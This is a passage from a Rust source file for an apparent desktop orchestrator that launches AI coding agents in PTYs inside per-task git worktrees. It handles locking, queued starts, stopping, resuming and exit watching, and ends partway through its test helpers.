    /// then spawn exactly as `start_task` does — but inline: the queue
    /// scheduler needs the outcome (its retry/backoff runs on errors), and
    /// a failure leaves the task a draft / queued rather than `failed`.
    ///
    /// Idempotent under the repo lock: the row is re-read inside it, and a
    /// task that has already launched (its branch exists) is returned as
    /// is. That's what keeps the queue scheduler and "Start now" — or two
    /// scheduler passes — from ever starting one task twice.
    pub async fn launch(
        &self,
        task_id: &str,
        user_id: Option<&str>,
        rows: Option<u16>,
        cols: Option<u16>,
    ) -> Result<StartedTask, OrchestratorError> {
        let workspace = self.get_task(task_id, user_id).await?;
        // The whole launch — fetch, worktree, hook, spawn — is one claim:
        // a second "Start now" (or a queue pass, or a `start_task` still
        // setting it up) while it runs returns the row instead of starting
        // the task again.
        let Some(starting) = self.begin_starting(task_id, &workspace.repository_id) else {
            return Ok(StartedTask {
                task_id: workspace.id.clone(),
                workspace,
            });
        };
        let started = self
            .launch_claimed(task_id, user_id, rows, cols, &starting)
            .await;
        drop(starting);
        started
    }

    /// `launch`'s work, for a task the caller has claimed (`begin_starting`;
    /// `_claim` is the proof, and the caller decides when it ends): fetch,
    /// cut + record the worktree under the repo lock, copy + hook, spawn.
    /// Shared by `launch` (inline) and `start_task` (in the background).
    async fn launch_claimed(
        &self,
        task_id: &str,
        user_id: Option<&str>,
        rows: Option<u16>,
        cols: Option<u16>,
        _claim: &StartingGuard,
    ) -> Result<StartedTask, OrchestratorError> {
        let mut workspace = self.get_task(task_id, user_id).await?;
        if is_failed_before_launch(&workspace) {
            // The queue gave up on it (`QueueScheduler`), or its background
            // start failed before the worktree: "Start now" retries.
            workspace = self
                .workspaces
                .update(
                    task_id,
                    WorkspaceUpdate {
                        status: Some(WorkspaceStatus::Pending),
                        exit_code: Some(None),
                        finished_at: Some(None),
                        ..Default::default()
                    },
                )
                .await?;
        }
        if !workspace.is_unlaunched() {
            return self.finish_interrupted_start(workspace, rows, cols).await;
        }
        let (repository, repository_path) = self
            .task_repository(&workspace.repository_id, user_id)
            .await?;
        let setup = self.setup_for(&workspace.repository_id).await;
        // The stored base is a synced column: re-validate at use.
        let base = setup.base_branch(workspace.base_branch.as_deref(), &repository.default_branch);
        validate_branch_name(&base).map_err(OrchestratorError::InvalidBaseBranch)?;
        let mut log = SetupLog::default();
        // Outside the repo lock: a slow network must not hold up every
        // other task in the repository.
        let start_point = self
            .start_point(&repository_path, &base, &setup, &mut log)
            .await;

        // Serialize git ops against the shared `.git` for this repo: `git
        // worktree add` writes `.git/worktrees/` and `.git/refs/` and races
        // spectacularly with other adds on the same repo.
        let lock = self.repo_locks.for_repository(&workspace.repository_id);
        let guard = lock.lock().await;
        let mut workspace = self.workspaces.get(task_id).await?;
        if !workspace.is_unlaunched() {
            return Ok(StartedTask {
                task_id: workspace.id.clone(),
                workspace,
            });
        }
        if workspace.agent.is_none() {
            return Err(OrchestratorError::AlreadyLaunched);
        }
        let worktree = match Self::cut_worktree(
            &repository_path,
            &mut workspace,
            &base,
            &start_point,
            &setup,
        )
        .await
        {
            Ok(worktree) => worktree,
            Err(err) => {
                // The fetch's notes belong next to the failure in the log.
                log.flush(&self.runtime.log_dir, task_id);
                return Err(err);
            }
        };
        self.workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    branch: Some(workspace.branch.clone()),
                    worktree_path: Some(workspace.worktree_path.clone()),
                    base_branch: Some(workspace.base_branch.clone()),
                    queued_at: Some(None),
                    ..Default::default()
                },
            )
            .await?;
        // The PTY spawn + status update touch only this task's own row and
        // process, not the shared `.git`.
        drop(guard);

        self.prepare_worktree(task_id, &repository_path, &worktree, &setup, log)
            .await;
        self.go_running(task_id, rows, cols).await
    }

    /// The queue couldn't start `task_id` after repeated attempts: take it
    /// out of the queue as `failed`, with `reason` in its log. The status
    /// event raises the "task failed" notification; "Start now" (`launch`)
    /// retries it. A task that launched meanwhile is left alone.
    pub async fn fail_unlaunched(
        &self,
        task_id: &str,
        reason: &str,
    ) -> Result<(), OrchestratorError> {
        let current = self.workspaces.get(task_id).await?;
        if !current.is_unlaunched() || self.is_starting(task_id) {
            return Ok(());
        }
        let updated = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Failed),
                    queued_at: Some(None),
                    finished_at: Some(Some(Utc::now())),
                    ..Default::default()
                },
            )
            .await?;
        let mut log = SetupLog::default();
        log.push(format!(
            "phasr: couldn't start this queued task after repeated attempts, so it left the queue: {reason}"
        ));
        log.flush(&self.runtime.log_dir, task_id);
        self.broadcast_status(TaskStatusEvent {
            task_id: task_id.to_string(),
            repository_id: updated.repository_id,
            status: WorkspaceStatus::Failed,
            exit_code: None,
        });
        Ok(())
    }

    /// `launch` of a row that already has its worktree but never ran: a
    /// setup interrupted by an app quit, or a legacy pre-created workspace.
    /// It is started here — the explicit start — rather than by opening
    /// its terminal (`open_terminal` refuses never-started rows). Anything
    /// else (running, stopped, finished) is returned as is.
    async fn finish_interrupted_start(
        &self,
        workspace: Workspace,
        rows: Option<u16>,
        cols: Option<u16>,
    ) -> Result<StartedTask, OrchestratorError> {
        let never_ran = workspace.workspace_kind == WorkspaceKind::Agent
            && workspace.status == WorkspaceStatus::Pending
            && workspace.started_at.is_none()
            && workspace.branch.is_some()
            && workspace.agent.is_some();
        if !never_ran || self.runtime.get(&workspace.id).is_some() {
            return Ok(StartedTask {
                task_id: workspace.id.clone(),
                workspace,
            });
        }
        self.go_running(&workspace.id, rows, cols).await
    }

    /// `pending → running` for a row whose worktree exists: register with
    /// `AgentSignals`, spawn the PTY (agent command + prompt), broadcast,
    /// and watch for its exit.
    async fn go_running(
        &self,
        task_id: &str,
        rows: Option<u16>,
        cols: Option<u16>,
    ) -> Result<StartedTask, OrchestratorError> {
        let lock = self.spawn_lock(task_id);
        let _spawning = lock.lock().await;
        let current = self.workspaces.get(task_id).await?;
        // Already running (nothing should get here any more, but if it
        // does): leave the live agent, its row and its signals alone.
        // Or closed / archived while its setup ran (minutes, with a hook):
        // the user is done with it, so no agent appears in it afterwards.
        if self.runtime.get(task_id).is_some()
            || current.status != WorkspaceStatus::Pending
            || current.outcome.is_some()
        {
            return Ok(StartedTask {
                task_id: task_id.to_string(),
                workspace: current,
            });
        }
        let worktree_path = match current.worktree_path.as_deref().map(PathBuf::from) {
            Some(path) if path.exists() => path,
            Some(path) => self.recreate_missing_worktree(&current, &path).await?,
            None => return Err(OrchestratorError::WorktreeUnavailable),
        };
        let command = self.launch_command(&current).await?;
        if command.mode_downgraded {
            eprintln!("[launch] task {task_id}: skip-all mode wasn't set on this machine; using the default mode");
        }

        let started_at = Utc::now();
        let updated = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Running),
                    started_at: Some(Some(started_at)),
                    ..Default::default()
                },
            )
            .await?;

        let launch = self
            .agent_launch(
                &updated,
                command.command,
                updated.prompt.clone(),
                &worktree_path,
                false,
            )
            .await;
        let pty_handle = self.spawn_agent_pty(
            task_id,
            worktree_path,
            launch,
            rows.unwrap_or(24),
            cols.unwrap_or(80),
        )?;

        self.broadcast_status(TaskStatusEvent {
            task_id: task_id.to_string(),
            repository_id: updated.repository_id.clone(),
            status: WorkspaceStatus::Running,
            exit_code: None,
        });

        self.spawn_exit_watcher(
            task_id.to_string(),
            updated.repository_id.clone(),
            pty_handle,
        );

        Ok(StartedTask {
            task_id: task_id.to_string(),
            workspace: updated,
        })
    }

    /// Ids of tasks with a live PTY.
    pub fn running_task_ids(&self) -> std::collections::HashSet<String> {
        self.runtime
            .activity()
            .into_iter()
            .map(|(id, _)| id)
            .collect()
    }

    /// Run the agent in the repository's own checkout, on its `local`
    /// workspace row — no worktree, no branch. The row is reused (one per
    /// repository), so only one in-place agent can run per repository.
    ///
    /// If the local workspace's terminal is open as a plain shell (no agent
    /// on the row), that shell is replaced by the agent: the in-place task
    /// *is* the local workspace's terminal from now on. A running in-place
    /// agent is never replaced — that's `InPlaceTaskRunning`.
    async fn start_in_place(
        &self,
        request: StartTaskRequest,
        repository: &Repository,
        repository_path: PathBuf,
    ) -> Result<StartedTask, OrchestratorError> {
        // Held through the spawn (unlike the worktree path): "is an agent
        // running here?" is answered from the row AND the live PTY, so the
        // check, the claim and the spawn must be one step per repository.
        let lock = self.repo_locks.for_repository(&request.repository_id);
        let _guard = lock.lock().await;

        let local = match self
            .workspaces
            .get_local_by_repository(&request.repository_id)
            .await?
        {
            Some(local) => local,
            None => {
                self.create_local_workspace(
                    repository,
                    &repository_path,
                    request.user_id.as_deref(),
                )
                .await?
            }
        };
        // Same owner rule as every other task id (a local row belongs to
        // its repository's account).
        if let Some(user_id) = request.user_id.as_deref() {
            self.workspaces.get_for_user(&local.id, user_id).await?;
        }

        let live = self.runtime.get(&local.id);
        if live.is_some() && local.status == WorkspaceStatus::Running && local.agent.is_some() {
            return Err(OrchestratorError::InPlaceTaskRunning);
        }
        if let Some(shell) = live {
            // Free the runtime slot for the agent. The old PTY's exit
            // watcher notices it was replaced and leaves the row alone
            // (see `spawn_exit_watcher`). The whole session, not just the
            // shell: a `pnpm dev` started in it would keep the checkout's
            // ports and files.
            shell.terminate(TERMINATE_GRACE);
            self.runtime.drop_task(&local.id);
        }

        let command = interpolate_for_task(&request.command, request.prompt.as_deref());
        let started_at = Utc::now();
        let claimed = self
            .workspaces
            .claim_local_for_task(
                &local.id,
                LocalTaskClaim {
                    agent: request.agent,
                    command: command.clone(),
                    prompt: request.prompt.clone(),
                    // The command layer always resolves one; a bare test
                    // request is recorded as what its command means today.
                    permission_mode: request.permission_mode.unwrap_or(PermissionMode::SkipAll),
                    notify_on_attention: request.notify_on_attention,
                    started_at,
                },
            )
            .await?;
        self.trust_mode_here(&claimed.id, claimed.permission_mode)
            .await;

        let launch = self
            .agent_launch(
                &claimed,
                Some(command),
                request.prompt.clone(),
                &repository_path,
                false,
            )
            .await;
        let pty_handle = self.spawn_agent_pty(
            &claimed.id,
            repository_path,
            launch,
            request.rows.unwrap_or(24),
            request.cols.unwrap_or(80),
        )?;

        self.broadcast_status(TaskStatusEvent {
            task_id: claimed.id.clone(),
            repository_id: claimed.repository_id.clone(),
            status: WorkspaceStatus::Running,
            exit_code: None,
        });
        self.spawn_exit_watcher(
            claimed.id.clone(),
            claimed.repository_id.clone(),
            pty_handle,
        );

        Ok(StartedTask {
            task_id: claimed.id.clone(),
            workspace: claimed,
        })
    }

    /// The `local` row `commands::repositories` normally creates when a
    /// repository is added; repositories added before local workspaces
    /// existed (or whose row was deleted) may not have one yet.
    async fn create_local_workspace(
        &self,
        repository: &Repository,
        repository_path: &Path,
        user_id: Option<&str>,
    ) -> Result<Workspace, OrchestratorError> {
        let mut workspace = Workspace::new(repository.id.clone(), "local".into(), String::new());
        workspace.workspace_kind = WorkspaceKind::Local;
        workspace.status = WorkspaceStatus::Stopped;
        workspace.branch = git::get_default_branch(repository_path);
        workspace.worktree_path = Some(repository_path.to_string_lossy().into_owned());
        match user_id {
            Some(user_id) => self.workspaces.insert_for_user(&workspace, user_id).await?,
            None => self.workspaces.insert(&workspace).await?,
        }
        Ok(workspace)
    }

    /// Stop a running task. Sends SIGINT first (gives the agent a
    /// chance to exit cleanly — Claude/Codex/Cursor all clean up
    /// state on SIGINT) and escalates to SIGKILL after `SIGINT_GRACE`
    /// if the child is still alive. Status flips to `stopped`. The
    /// worktree is preserved — only `delete_task` removes it.
    pub async fn stop_task(&self, task_id: &str) -> Result<(), OrchestratorError> {
        // Out of the map NOW, not after the grace period: a reopen during
        // the grace must spawn a fresh session, not attach to this dying
        // one (whose delayed terminate would then kill what the user is
        // looking at). Its exit watcher sees it was replaced and leaves
        // the row alone; the row is settled below.
        let handle = self
            .runtime
            .retire(task_id)
            .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;

        // Best-effort SIGINT. Errors are non-fatal — we'll escalate.
        let _ = handle.interrupt();
        if let Some(signals) = &self.signals {
            signals.mark_exited(task_id);
        }

        tokio::spawn(async move {
            tokio::time::sleep(SIGINT_GRACE).await;
            // Only THIS handle: a session reopened meanwhile is another
            // PTY and is never touched.
            if handle.exit_code().is_none() {
                // The whole terminal session (the agent and anything it
                // or the user started), HUP → TERM → KILL.
                handle.terminate(TERMINATE_GRACE);
            }
        });

        let updated = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Stopped),
                    finished_at: Some(Some(Utc::now())),
                    ..Default::default()
                },
            )
            .await?;
        self.broadcast_status(TaskStatusEvent {
            task_id: task_id.to_string(),
            repository_id: updated.repository_id,
            status: WorkspaceStatus::Stopped,
            exit_code: None,
        });
        Ok(())
    }

    /// Kill a task's PTY immediately, for callers that are tearing the
    /// workspace down (archive, delete). Unlike `stop_task` there's no
    /// SIGINT grace period — nothing in-process is worth preserving.
    ///
    /// **The order is the entire point.** `spawn_exit_watcher` flips a
    /// still-`running` row to `failed` on any non-zero exit — which is
    /// exactly what SIGKILL produces — and broadcasts it. Killing first
    /// therefore reports the user's own delete back to them as "the
    /// agent exited with an error", for a workspace that no longer
    /// exists. Moving the row out of `running` first makes the watcher's
    /// guard skip it. `stop_task` already honours this contract; every
    /// other teardown path must too.
    ///
    /// No status broadcast: the caller is about to archive or delete the
    /// row and will publish that transition itself.
    pub async fn quiesce_task(&self, task_id: &str) {
        // Archive/delete are the end of this task id's life as far as the
        // terminal is concerned; don't keep vouching for it.
        self.verified_owners.lock().remove(task_id);
        self.spawn_locks.lock().remove(task_id);
        if let Some(signals) = &self.signals {
            signals.forget_task(task_id);
        }
        let Some(handle) = self.runtime.get(task_id) else {
            return;
        };
        let _ = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Stopped),
                    finished_at: Some(Some(Utc::now())),
                    ..Default::default()
                },
            )
            .await;
        handle.terminate(TERMINATE_GRACE);
        self.runtime.drop_task(task_id);
    }

    /// Open the task's terminal stream. If the PTY is still alive, this
    /// attaches to it with replay. If the row is pending/stopped (or a
    /// stale running row somehow has no process), this resumes the task
    /// in the same worktree and starts a fresh exit watcher.
    pub async fn open_terminal(
        &self,
        task_id: &str,
        rows: u16,
        cols: u16,
    ) -> Result<TaskTerminalSubscription, OrchestratorError> {
        // One opener at a time per task: a second concurrent open waits,
        // then attaches to the agent the first one spawned.
        let lock = self.spawn_lock(task_id);
        let _spawning = lock.lock().await;
        let workspace = self.workspaces.get(task_id).await?;

        if let Some(handle) = self.runtime.get(task_id) {
            let (replay, rx) = handle.subscribe_with_replay();
            return Ok(TaskTerminalSubscription {
                task_id: task_id.to_string(),
                started_at: workspace.started_at.unwrap_or_else(Utc::now),
                replay,
                rx,
            });
        }

        if matches!(
            workspace.status,
            WorkspaceStatus::Completed | WorkspaceStatus::Failed | WorkspaceStatus::Archived
        ) {
            return Err(OrchestratorError::AlreadyFinished(
                workspace.status.as_str().into(),
            ));
        }
        // Its launch is still setting it up: the agent spawns when the
        // after-create hook is done. Spawning here too ran it twice.
        if self.is_starting(task_id) {
            return Err(OrchestratorError::Starting);
        }
        // Only a task that has run before is RESUMED here. A draft or
        // queued task (no worktree: it would run in the repository's own
        // checkout), or one whose setup was interrupted, starts through
        // `launch` — the explicit start — never by opening its terminal.
        if workspace.status == WorkspaceStatus::Pending && workspace.started_at.is_none() {
            return Err(OrchestratorError::NotStarted);
        }

        let cwd = self.cwd_for_task(&workspace).await?;
        let launch_command = self.launch_command(&workspace).await?;
        if launch_command.mode_downgraded {
            eprintln!("[launch] task {task_id}: skip-all mode wasn't set on this machine; resuming in the default mode");
        }
        let initial_command = launch_command.command;
        let initial_prompt = workspace.prompt.as_ref().and_then(|p| {
            let trimmed = p.trim();
            if trimmed.is_empty() {
                None
            } else {
                Some(trimmed.to_string())
            }
        });

        // It ran before → continue that conversation rather than start a
        // new one with the original prompt typed again.
        let resuming = workspace.started_at.is_some();

        let now = Utc::now();
        let updated = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Running),
                    started_at: Some(Some(now)),
                    exit_code: Some(None),
                    finished_at: Some(None),
                    ..Default::default()
                },
            )
            .await?;

        let launch = self
            .agent_launch(&updated, initial_command, initial_prompt, &cwd, resuming)
            .await;
        let handle = self.spawn_agent_pty(task_id, cwd, launch, rows, cols)?;

        self.broadcast_status(TaskStatusEvent {
            task_id: task_id.to_string(),
            repository_id: updated.repository_id.clone(),
            status: WorkspaceStatus::Running,
            exit_code: None,
        });

        self.spawn_exit_watcher(task_id.to_string(), updated.repository_id, handle.clone());

        let (replay, rx) = handle.subscribe_with_replay();
        Ok(TaskTerminalSubscription {
            task_id: task_id.to_string(),
            started_at: now,
            replay,
            rx,
        })
    }

    pub async fn read_task_log(&self, task_id: &str) -> Result<String, OrchestratorError> {
        let path = self.runtime.log_dir.join(format!("{task_id}.log"));
        let bytes = match tokio::fs::read(&path).await {
            Ok(bytes) => bytes,
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(String::new()),
            Err(err) => return Err(OrchestratorError::Pty(err.into())),
        };
        Ok(String::from_utf8_lossy(&bytes).into_owned())
    }

    pub fn resize_task(
        &self,
        task_id: &str,
        rows: u16,
        cols: u16,
    ) -> Result<(), OrchestratorError> {
        let handle = self
            .runtime
            .get(task_id)
            .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
        handle.resize(rows, cols)?;
        Ok(())
    }

    pub fn interrupt_task(&self, task_id: &str) -> Result<(), OrchestratorError> {
        let handle = self
            .runtime
            .get(task_id)
            .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
        handle.interrupt()?;
        Ok(())
    }

    /// Write bytes to the task's PTY stdin — used by the React
    /// terminal for live agent input.
    pub fn send_input(&self, task_id: &str, bytes: &[u8]) -> Result<(), OrchestratorError> {
        let handle = self
            .runtime
            .get(task_id)
            .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
        handle.write(bytes)?;
        if let Some(signals) = &self.signals {
            signals.note_user_input(task_id, bytes);
        }
        Ok(())
    }

    /// Deliver `text` to the task's agent as one message (bracketed-paste
    /// aware), pressing Enter if `submit` — the composer's send path.
    pub async fn send_message(
        &self,
        task_id: &str,
        text: &str,
        submit: bool,
    ) -> Result<(), OrchestratorError> {
        let handle = self
            .runtime
            .get(task_id)
            .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
        // A message ends in Enter, and Enter on an approval dialog picks
        // the highlighted option — "Yes". The dialog is answered through
        // `respond_to_attention` (or the terminal), never the composer.
        if self
            .signals
            .as_ref()
            .is_some_and(|s| s.awaiting_answer(task_id))
        {
            return Err(OrchestratorError::AwaitingAnswer);
        }
        handle.send_message(text, submit).await?;
        if let Some(signals) = &self.signals {
            let sent: &[u8] = if text.is_empty() {
                b"\r"
            } else {
                text.as_bytes()
            };
            signals.note_user_input(task_id, sent);
        }
        Ok(())
    }

    /// Answer the agent's approval dialog from the app. The attention id is
    /// checked (and consumed) first: a stale or unanswerable card writes
    /// nothing to the PTY. The PTY is looked up before claiming so a dead
    /// task doesn't silently eat the user's answer.
    ///
    /// A multi-key answer (the trust dialog's Down-then-Enter) goes out one
    /// keystroke at a time, `KEYSTROKE_GAP` apart — see `split_keystrokes`.
    pub async fn respond_to_attention(
        &self,
        task_id: &str,
        attention_id: &str,
        response: AttentionResponse,
    ) -> Result<(), OrchestratorError> {
        let handle = self
            .runtime
            .get(task_id)
            .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
        let signals = self
            .signals
            .as_ref()
            .ok_or(crate::agent_signals::AgentSignalError::StaleAttention)?;
        let keys = signals.claim_attention(task_id, attention_id, response)?;
        for (i, key) in crate::agent_signals::split_keystrokes(&keys)
            .into_iter()
            .enumerate()
        {
            if i > 0 {
                tokio::time::sleep(KEYSTROKE_GAP).await;
            }
            handle.write(key.as_bytes())?;
        }
        Ok(())
    }

    async fn cwd_for_task(&self, workspace: &Workspace) -> Result<PathBuf, OrchestratorError> {
        if let Some(path) = workspace.worktree_path.as_deref() {
            let path = PathBuf::from(path);
            if path.exists() {
                return Ok(path);
            }
            // Self-heal (F1): the DB still points at a worktree dir that's
            // gone — a moved repo, a cleaned temp dir, or a row synced from
            // another machine. Recreate it from the workspace's branch
            // instead of returning `RepositoryPathMissing` → the terminal's
            // "✗ Failed to start". `create_worktree` is idempotent and
            // re-attaches an existing branch, so this restores the exact
            // branch the agent was on.
            return self.recreate_missing_worktree(workspace, &path).await;
        }
        // An agent task runs in its own worktree, never in the repository's
        // checkout: a row with no worktree here (never launched, or synced
        // without a branch) has nowhere safe to run.
        if workspace.workspace_kind == WorkspaceKind::Agent {
            return Err(OrchestratorError::WorktreeUnavailable);
        }

        let repository = self.repositories.get(&workspace.repository_id).await?;
        let path = repository
            .local_path
            .as_deref()
            .map(PathBuf::from)
            .ok_or(OrchestratorError::RepositoryHasNoLocalPath)?;
        if !path.exists() {
            return Err(OrchestratorError::RepositoryPathMissing(
                path.to_string_lossy().into_owned(),
            ));
        }
        Ok(path)
    }

    /// Recreate a missing worktree at `worktree_path` from the workspace's
    /// branch, under the shared per-repo lock. Returns the calm
    /// `WorktreeUnavailable` error — not a hard `RepositoryPathMissing` —
    /// when recreation is impossible: no branch recorded, the repository
    /// has no local path on this machine, or that checkout is itself gone.
    async fn recreate_missing_worktree(
        &self,
        workspace: &Workspace,
        worktree_path: &Path,
    ) -> Result<PathBuf, OrchestratorError> {
        // A merged/closed task's worktree is gone on purpose (discarded, or
        // cleaned up after merge): recreating it would resurrect a deleted
        // branch from its base as an empty task.
        if workspace.outcome.is_some() {
            return Err(OrchestratorError::WorktreeUnavailable);
        }
        let branch = workspace
            .branch
            .as_deref()
            .ok_or(OrchestratorError::WorktreeUnavailable)?;
        let repository = self.repositories.get(&workspace.repository_id).await?;
        let repo_path = repository
            .local_path
            .as_deref()
            .map(PathBuf::from)
            .ok_or(OrchestratorError::WorktreeUnavailable)?;
        if !repo_path.join(".git").exists() {
            return Err(OrchestratorError::WorktreeUnavailable);
        }
        let base_ref = workspace
            .base_branch
            .clone()
            .unwrap_or_else(|| repository.default_branch.clone());
        let worktree_path = worktree_path.to_path_buf();

        // Serialize the worktree-add against every other shared-`.git`
        // mutation for this repo (F6) — same lock start_task uses.
        let lock = self.repo_locks.for_repository(&workspace.repository_id);
        let _guard = lock.lock().await;
        // A full checkout: off the async runtime (see `cut_worktree`).
        let (branch, path) = (branch.to_string(), worktree_path.clone());
        blocking_git(move || git::create_worktree(&repo_path, &path, &branch, &base_ref)).await?;
        Ok(worktree_path)
    }

    fn broadcast_status(&self, event: TaskStatusEvent) {
        // No-op if there are no subscribers — that's fine.
        let _ = self.status_tx.send(event);
    }

    /// Spawn a task that listens for the PTY's `Exit` event and flips
    /// the row to `completed` (code 0) or `failed` (otherwise). Note
    /// that interactive agents (Claude, Codex, etc.) almost never
    /// exit on their own — they sit at a prompt waiting for input.
    /// This handler only fires on real process death: a crash, the
    /// user typing `exit`, or an explicit kill.
    fn spawn_exit_watcher(&self, task_id: String, repository_id: String, handle: Arc<PtyHandle>) {
        let mut rx = handle.subscribe();
        // Weak: identity only — the watcher must not extend the PTY's life.
        let watched = Arc::downgrade(&handle);
        drop(handle);
        let workspaces = self.workspaces.clone();
        let runtime = self.runtime.clone();
        let status_tx = self.status_tx.clone();
        let signals = self.signals.clone();

        tokio::spawn(async move {
            loop {
                match rx.recv().await {
                    Ok(PtyEvent::Output { .. }) => continue,
                    Ok(PtyEvent::Exit { exit_code, .. }) => {
                        // Only the PTY currently registered for this task may
                        // settle its row. An in-place start replaces the
                        // local workspace's shell under the same id; the
                        // replaced shell's exit must neither flip the agent's
                        // fresh `running` row to `failed` nor unregister the
                        // agent's PTY. (A quiesced task is already
                        // unregistered and its row already `stopped`.)
                        let still_ours = runtime.get(&task_id).is_some_and(|current| {
                            std::ptr::eq(Arc::as_ptr(&current), watched.as_ptr())
                        });
                        if !still_ours {
                            break;
                        }
                        if let Some(signals) = &signals {
                            signals.mark_exited(&task_id);
                        }
                        let current = workspaces.get(&task_id).await.ok();
                        if !current
                            .as_ref()
                            .is_some_and(|w| w.status == WorkspaceStatus::Running)
                        {
                            runtime.drop_task(&task_id);
                            break;
                        }
                        let next = if exit_code == Some(0) {
                            WorkspaceStatus::Completed
                        } else {
                            WorkspaceStatus::Failed
                        };
                        let update = WorkspaceUpdate {
                            // Only flip if we're still in `running` —
                            // if `stop_task` already moved us to
                            // `stopped`, leave it alone.
                            status: Some(next),
                            exit_code: Some(exit_code),
                            finished_at: Some(Some(Utc::now())),
                            ..Default::default()
                        };
                        let flipped = workspaces.update(&task_id, update).await.ok();
                        runtime.drop_task(&task_id);
                        if flipped.is_some() {
                            let _ = status_tx.send(TaskStatusEvent {
                                task_id: task_id.clone(),
                                repository_id: repository_id.clone(),
                                status: next,
                                exit_code,
                            });
                        }
                        break;
                    }
                    Err(broadcast::error::RecvError::Lagged(_)) => continue,
                    Err(broadcast::error::RecvError::Closed) => break,
                }
            }
        });
    }
}

#[cfg(test)]
impl TaskOrchestrator {
    /// `start_task`, then wait for its background launch: the task as it
    /// is once running (or the error that failed it).
    pub async fn start_task_and_wait(
        &self,
        request: StartTaskRequest,
    ) -> Result<StartedTask, OrchestratorError> {
        self.start_task(request).await?.launched().await
    }
}

/// Run a synchronous git operation on the blocking pool (see
/// `cut_worktree`). A `JoinError` only happens if it panicked; it surfaces
/// as a git failure rather than taking the caller down with it.
async fn blocking_git<T, F>(f: F) -> Result<T, OrchestratorError>
where
    F: FnOnce() -> Result<T, git::GitError> + Send + 'static,
    T: Send + 'static,
{
    tokio::task::spawn_blocking(f)
        .await
        .map_err(|e| git::GitError::CommandFailed(format!("git task failed: {e}")))?
        .map_err(OrchestratorError::from)
}

/// A queued task the scheduler gave up on before it ever launched (see
/// `QueueScheduler`): `failed`, no branch. "Start now" may retry it.
fn is_failed_before_launch(workspace: &Workspace) -> bool {
    workspace.workspace_kind == WorkspaceKind::Agent
        && workspace.status == WorkspaceStatus::Failed
        && workspace.branch.is_none()
        && workspace.outcome.is_none()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domain::{Repository, WorkspaceKind};
    use crate::store::{init_pool, RepositoryRepo};
    use std::path::Path;
    use std::process::Command;
    use std::time::Duration;

    async fn fresh_orchestrator() -> (
        TaskOrchestrator,
        RepositoryRepo,
        crate::store::Db,
        tempfile::TempDir,
    ) {
        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("test.sqlite");
        let pool = init_pool(&db_path).await.unwrap();
        let workspaces = WorkspaceRepo::new(pool.clone());
        let repositories = RepositoryRepo::new(pool.clone());
        let log_dir = dir.path().join("logs");
        let runtime = Arc::new(TaskRuntime::new(log_dir));
        let repo_locks = Arc::new(RepoLockRegistry::new());
        let orchestrator =
            TaskOrchestrator::new(workspaces, repositories.clone(), runtime, repo_locks);
        (orchestrator, repositories, pool, dir)
    }

    fn init_repo(path: &Path) {
        Command::new("git")
            .args(["init", "-q", "-b", "main"])
            .current_dir(path)
            .status()
            .unwrap();
        Command::new("git")
            .args(["config", "user.email", "t@example.com"])
            .current_dir(path)
            .status()
            .unwrap();
        Command::new("git")
            .args(["config", "user.name", "tester"])
            .current_dir(path)
            .status()
            .unwrap();
        std::fs::write(path.join("README.md"), "hi").unwrap();
        Command::new("git")
            .args(["add", "-A"])
            .current_dir(path)
            .status()
            .unwrap();
        Command::new("git")
            .args(["commit", "-qm", "init"])
            .current_dir(path)
            .status()
            .unwrap();
    }

    /// Number of worktrees registered against `repo` (the main checkout
    /// counts as one).
    fn count_worktrees(repo: &Path) -> usize {
        let out = Command::new("git")
            .args(["worktree", "list", "--porcelain"])
            .current_dir(repo)
            .output()
            .unwrap();
        String::from_utf8_lossy(&out.stdout)
            .lines()
            .filter(|l| l.starts_with("worktree "))
            .count()
    }

    /// Number of local `phasr/*` branches in `repo`.
    fn count_phasr_branches(repo: &Path) -> usize {
        let out = Command::new("git")
            .args(["branch", "--list", "phasr/*"])
            .current_dir(repo)
            .output()
            .unwrap();
        String::from_utf8_lossy(&out.stdout)
            .lines()
            .filter(|l| !l.trim().is_empty())
            .count()
    }

    /// Insert a repository whose local path is a fresh, one-commit git repo
    /// under `tmp/<dir_name>`, so worktree creation actually works.
    async fn repo_with_git(
        repositories: &RepositoryRepo,
        tmp: &tempfile::TempDir,
        dir_name: &str,
    ) -> Repository {
        let repo_dir = tmp.path().join(dir_name);
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();
        repo
    }

    /// A long-lived start request. `sleep 30` keeps the agent `running` for
    /// the whole test, so a subsequent duplicate deterministically observes
    /// an ACTIVE task regardless of PTY scheduling. `user_id: None` exercises
    /// the sessionless (unscoped) dedup path.
    fn sleep_request(repository_id: &str, name: &str) -> StartTaskRequest {
        StartTaskRequest {
            repository_id: repository_id.to_string(),
            user_id: None,
            agent: Agent::Claude,
            command: "sleep 30".into(),
            name: name.to_string(),
            prompt: None,
            base_branch: None,
            rows: None,
            cols: None,
            permission_mode: None,
            notify_on_attention: true,
            run_in: RunIn::Worktree,
        }
    }

    /// Kill each task's PTY (SIGINT terminates `sleep`) and drop its worktree
    /// dir — worktrees live under `$HOME/.phasr`, outside the test TempDir, so
    /// they'd otherwise linger. Safe to call with deduped tasks that share a
    /// task_id/worktree (double stop/remove is a no-op).
    async fn cleanup(orchestrator: &TaskOrchestrator, tasks: &[&StartedTask]) {
        for t in tasks {
            let _ = orchestrator.stop_task(&t.task_id).await;
